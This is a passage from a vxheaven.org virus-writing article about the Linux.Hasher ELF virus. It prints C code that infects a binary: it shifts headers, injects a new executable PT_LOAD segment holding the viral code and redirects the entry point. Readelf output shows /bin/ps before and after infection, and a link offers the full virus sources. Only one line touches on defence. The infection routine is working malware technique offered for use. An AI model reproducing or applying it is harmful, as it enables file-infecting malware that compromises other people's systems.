+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">break</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* fix .dynamic */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>j <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span> dyn<span style="color: black;">&#91;</span>j<span style="color: black;">&#93;</span>.<span style="color: #202020;">d_tag</span> <span style="color: #339933;">!=</span> DT_NULL<span style="color: #339933;">;</span> j<span style="color: #339933;">++</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>dyn<span style="color: black;">&#91;</span>j<span style="color: black;">&#93;</span>.<span style="color: #202020;">d_un</span>.<span style="color: #202020;">d_ptr</span> <span style="color: #339933;">==</span> shdr<span style="color: black;">&#91;</span>k<span style="color: black;">&#93;</span>.<span style="color: #202020;">sh_addr</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dyn<span style="color: black;">&#91;</span>j<span style="color: black;">&#93;</span>.<span style="color: #202020;">d_un</span>.<span style="color: #202020;">d_ptr</span> <span style="color: #339933;">+=</span> <span style="color: #0000dd;">32</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; shdr<span style="color: black;">&#91;</span>k<span style="color: black;">&#93;</span>.<span style="color: #202020;">sh_addr</span> <span style="color: #339933;">+=</span> <span style="color: #0000dd;">32</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; shdr<span style="color: black;">&#91;</span>k<span style="color: black;">&#93;</span>.<span style="color: #202020;">sh_offset</span> <span style="color: #339933;">+=</span> <span style="color: #0000dd;">32</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* find min va (t), index of last PT_LOAD (u) and PT_PHDR (ph) */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; t <span style="color: #339933;">=</span> <span style="color: #208080;">0xffffffff</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; FOR_EACH_PHDR <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>phdr<span style="color: #339933;">-&gt;</span>p_vaddr <span style="color: #339933;">!=</span> <span style="color: #0000dd;">0</span> <span style="color: #339933;">&amp;&amp;</span> phdr<span style="color: #339933;">-&gt;</span>p_vaddr <span style="color: #339933;">&lt;</span> t<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; t <span style="color: #339933;">=</span> phdr<span style="color: #339933;">-&gt;</span>p_vaddr<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>phdr<span style="color: #339933;">-&gt;</span>p_type <span style="color: #339933;">==</span> PT_LOAD<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; u <span style="color: #339933;">=</span> i<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>phdr<span style="color: #339933;">-&gt;</span>p_type <span style="color: #339933;">==</span> PT_PHDR<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ph <span style="color: #339933;">=</span> phdr<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ASSERT<span style="color: black;">&#40;</span>t <span style="color: #339933;">!=</span> <span style="color: #208080;">0xffffffff</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* fix PT_PHDR */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ph<span style="color: #339933;">-&gt;</span>p_filesz <span style="color: #339933;">+=</span> <span style="color: #0000dd;">32</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ph<span style="color: #339933;">-&gt;</span>p_memsz <span style="color: #339933;">+=</span> <span style="color: #0000dd;">32</span><span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* add new PHT entry */</span> &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ehdr<span style="color: #339933;">-&gt;</span>e_phnum<span style="color: #339933;">++;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; phdr <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span>Elf32_Phdr<span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>m <span style="color: #339933;">+</span> ehdr<span style="color: #339933;">-&gt;</span>e_phoff<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/memmove.html"><span style="color: #000066;">memmove</span></a><span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>phdr<span style="color: black;">&#91;</span>u <span style="color: #339933;">+</span> <span style="color: #0000dd;">2</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span>phdr<span style="color: black;">&#91;</span>u <span style="color: #339933;">+</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: black;">&#40;</span>ehdr<span style="color: #339933;">-&gt;</span>e_phnum <span style="color: #339933;">-</span> u <span style="color: #339933;">-</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span> <span style="color: #339933;">*</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>Elf32_Phdr<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; v <span style="color: #339933;">=</span> phdr<span style="color: black;">&#91;</span>u<span style="color: black;">&#93;</span>.<span style="color: #202020;">p_offset</span> <span style="color: #339933;">+</span> phdr<span style="color: black;">&#91;</span>u<span style="color: black;">&#93;</span>.<span style="color: #202020;">p_filesz</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ph <span style="color: #339933;">=</span> <span style="color: #339933;">&amp;</span>phdr<span style="color: black;">&#91;</span>u <span style="color: #339933;">+</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ph<span style="color: #339933;">-&gt;</span>p_type &nbsp; &nbsp; &nbsp;<span style="color: #339933;">=</span> PT_LOAD<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ph<span style="color: #339933;">-&gt;</span>p_flags &nbsp; &nbsp; <span style="color: #339933;">=</span> PF_R<span style="color: #339933;">|</span>PF_X<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ph<span style="color: #339933;">-&gt;</span>p_align &nbsp; &nbsp; <span style="color: #339933;">=</span> <span style="color: #208080;">0x1000</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ph<span style="color: #339933;">-&gt;</span>p_offset &nbsp; &nbsp;<span style="color: #339933;">=</span> v<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ph<span style="color: #339933;">-&gt;</span>p_filesz &nbsp; &nbsp;<span style="color: #339933;">=</span> ph<span style="color: #339933;">-&gt;</span>p_memsz <span style="color: #339933;">=</span> code_len<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ph<span style="color: #339933;">-&gt;</span>p_vaddr &nbsp; &nbsp; <span style="color: #339933;">=</span> ph<span style="color: #339933;">-&gt;</span>p_paddr <span style="color: #339933;">=</span> t <span style="color: #339933;">-</span> <span style="color: #0000dd;">2</span> <span style="color: #339933;">*</span> PAGE_SIZE <span style="color: #339933;">+</span> <span style="color: black;">&#40;</span>v <span style="color: #339933;">&amp;</span> <span style="color: black;">&#40;</span>PAGE_SIZE <span style="color: #339933;">-</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; MAKE_HOLE<span style="color: black;">&#40;</span>v<span style="color: #339933;">,</span> PAGE_SIZE<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/memset.html"><span style="color: #000066;">memset</span></a><span style="color: black;">&#40;</span>m <span style="color: #339933;">+</span> v<span style="color: #339933;">,</span> <span style="color: #208080;">0x90</span><span style="color: #339933;">,</span> PAGE_SIZE<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/memcpy.html"><span style="color: #000066;">memcpy</span></a><span style="color: black;">&#40;</span>m <span style="color: #339933;">+</span> v<span style="color: #339933;">,</span> code<span style="color: #339933;">,</span> code_len<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; SHIFT_SHDRS<span style="color: black;">&#40;</span>v<span style="color: #339933;">,</span> PAGE_SIZE<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* change entry point */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; ehdr<span style="color: #339933;">-&gt;</span>e_entry <span style="color: #339933;">=</span> ph<span style="color: #339933;">-&gt;</span>p_vaddr<span style="color: #339933;">;</span><br/>
+&nbsp;</div>
+<p>The changes in the file (/bin/ps + Linux.Hasher.d):</p>
+<pre class="source"><strong>Before infection</strong>
+Program Headers:
+  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
+  PHDR           0x000034 0x08047034 0x08047034 0x00100 0x00100 R E 0x4
+  INTERP         0x000134 0x08047134 0x08047134 0x00013 0x00013 R   0x1
+      [Requesting program interpreter: /lib/ld-linux.so.2]
+  LOAD           0x000000 0x08047000 0x08047000 0x0ff88 0x0ff88 R E 0x1000
+  LOAD           0x010000 0x08057000 0x08057000 0x002fc 0x20654 RW  0x1000
+  DYNAMIC        0x010014 0x08057014 0x08057014 0x000d0 0x000d0 RW  0x4
+  NOTE           0x000148 0x08047148 0x08047148 0x00020 0x00020 R   0x4
+  GNU_EH_FRAME   0x00ff38 0x08056f38 0x08056f38 0x00014 0x00014 R   0x4
+  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
+Section Headers:
+  ...
+  [ 1] .interp           PROGBITS        08047134 000134 000013 00   A  0   0  1
+  [ 2] .note.ABI-tag     NOTE            08047148 000148 000020 00   A  0   0  4
+  [ 3] .dynstr           STRTAB          08047168 000168 00030a 00   A  0   0  1
+  [ 4] .gnu.liblist      GNU_LIBLIST     08047474 000474 00003c 14   A  3   0  4
+  [ 5] .gnu.conflict     RELA            080474b0 0004b0 00012c 0c   A  7   0  4
+  [ 6] .hash             HASH            08048168 001168 00023c 04   A  7   0  4  
+  ...
+Dynamic section at offset 0x10014 contains 25 entries:
+  0x00000004 (HASH)                       0x8048168
+  0x00000005 (STRTAB)                     0x8047168
+  ...
+  0x6ffffef9 (GNU_LIBLIST)                0x8047474
+  ...
+  0x6ffffef8 (GNU_CONFLICT)               0x80474b0
+<strong>After</strong>
+Program Headers:
+  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
+  PHDR           0x000034 0x08047034 0x08047034 <strong>0x00120 0x00120</strong> R E 0x4
+  INTERP         <strong>0x000154 0x08047154 0x08047154</strong> 0x00013 0x00013 R   0x1
+      [Requesting program interpreter: /lib/ld-linux.so.2]
+  LOAD           0x000000 0x08047000 0x08047000 0x0ff88 0x0ff88 R E 0x1000
+  LOAD           0x010000 0x08057000 0x08057000 0x002fc 0x20654 RW  0x1000
+  <strong>LOAD           0x01107c 0x0804607c 0x0804607c 0x003e8 0x003e8 R E 0x1000</strong>
+  DYNAMIC        0x010014 0x08057014 0x08057014 0x000d0 0x000d0 RW  0x4
+  <strong>NOTE           0x000168 0x08047168 0x08047168</strong> 0x00020 0x00020 R   0x4
+  GNU_EH_FRAME   0x00ff38 0x08056f38 0x08056f38 0x00014 0x00014 R   0x4
+  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
+Section Headers:
+  ...
+  [ 1] .interp           PROGBITS        <strong>08047154 000154</strong> 000013 00   A  0   0  1
+  [ 2] .note.ABI-tag     NOTE            <strong>08047168 000168</strong> 000020 00   A  0   0  4
+  [ 3] .dynstr           STRTAB          <strong>08047188 000188</strong> 00030a 00   A  0   0  1
+  [ 4] .gnu.liblist      GNU_LIBLIST     <strong>08047494 000494</strong> 00003c 14   A  3   0  4
+  [ 5] .gnu.conflict     RELA            <strong>080474d0 0004d0</strong> 00012c 0c   A  7   0  4
+  [ 6] .hash             HASH            <strong>08048188 001188 00021c</strong> 04   A  7   0  4
+  ...
+Dynamic section at offset 0x10014 contains 25 entries:
+  0x00000004 (HASH)                       <strong>0x8048188</strong>
+  0x00000005 (STRTAB)                     <strong>0x8047188</strong>
+  ...
+  0x6ffffef9 (GNU_LIBLIST)                <strong>0x8047494</strong>
+  ...
+  0x6ffffef8 (GNU_CONFLICT)               <strong>0x80474d0</strong>
+</pre>
+<p>To stop this kind of infection from working it is sufficient to place .hash not before, but after the code and data sections (they cannot be moved), that however will not interfere with the previous variants.</p>
+<p>Properly speaking, that is all. Any comments are welcome. <a href="/cdn-cgi/l/email-protection#046c61766935702a727c446369656d682a676b69"><span class="__cf_email__" data-cfemail="5e363b2c336f2a7028261e39333f3732703d3133">[email&#160;protected]</span><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></a></p>
+<p>The sources of Linux.Hasher (a,b,c,d) <a href="http://vx.org.ua/herm1t/Linux.Hasher.zip">attached</a>.</p>
+<h2><a name="c5"></a>References</h2>
+<ol>
+<li>Tool Interface Standard (TIS) Executable and Linking Format (ELF) Specification Version 1.2 (May 1995)</li>
+<li>Tiny C Compiler http://fabrice.bellard.free.fr/tcc/</li>
+<li>Alexander Bartolich "<a href="/lib/vab00.html">The ELF Virus Writing HOWTO</a>" (Feb 2003)</li>
+</ol>
+[<a style="" href="/lib/?lang=EN&amp;index=UN#vhe02">Back to index</a>] [<a href="/lib/vhe02.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
+<script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vhe02">de</a><a href="/lib/index.php?lang=en&amp;id=vhe02">en</a><a href="/lib/index.php?lang=es&amp;id=vhe02">es</a><a href="/lib/index.php?lang=it&amp;id=vhe02">it</a><a href="/lib/index.php?lang=fr&amp;id=vhe02">fr</a><a href="/lib/index.php?lang=pl&amp;id=vhe02">pl</a><a href="/lib/index.php?lang=ru&amp;id=vhe02">ru</a><a href="/lib/index.php?lang=ua&amp;id=vhe02">ua</a></div>
+<script>/* <![CDATA[ */(function(d,s,a,i,j,r,l,m,t){try{l=d.getElementsByTagName('a');t=d.createElement('textarea');for(i=0;l.length-i;i++){try{a=l[i].href;s=a.indexOf('/cdn-cgi/l/email-protection');m=a.length;if(a&&s>-1&&m>28){j=28+s;s='';if(j<m){r='0x'+a.substr(j,2)|0;for(j+=2;j<m&&a.charAt(j)!='X';j+=2)s+='%'+('0'+('0x'+a.substr(j,2)^r).toString(16)).slice(-2);j++;s=decodeURIComponent(s)+a.substr(j,m-j)}t.innerHTML=s.replace(/</g,'&lt;').replace(/\>/g,'&gt;');l[i].href='mailto:'+t.value}}catch(e){}}}catch(e){}})(document);/* ]]> */</script></body>
+</html>
